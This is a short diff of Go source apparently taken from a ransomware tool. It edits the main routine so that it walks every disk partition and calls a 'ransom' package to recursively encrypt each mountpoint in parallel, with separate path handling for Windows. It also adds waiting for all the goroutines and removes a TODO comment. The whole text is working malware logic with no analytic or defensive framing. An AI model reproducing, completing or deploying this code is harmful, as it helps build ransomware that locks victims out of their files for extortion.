@@ -46,12 +46,19 @@ func main() {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
-				err := ransom.RecursivelyDecryptDirectory(partition.Mountpoint, keyBytes)
+				var err error
+				if runtime.GOOS == "windows" {
+					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint+"\\", keyBytes)
+				} else {
+					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint, keyBytes)
+				}
 				if err != nil {
 					fmt.Println(err)
 				}
 			}()
 		}
+		wg.Wait()
+		fmt.Println("Done...")
 		return
 	}
 
@@ -79,7 +86,6 @@ func main() {
 	for _, partition := range partitions {
 		wg.Add(1)
 
-		//TODO: check if this works without the custom checking for windows, since the unix paths already have the trailing "/"
 		go func() {
 			defer wg.Done()
 			var err error
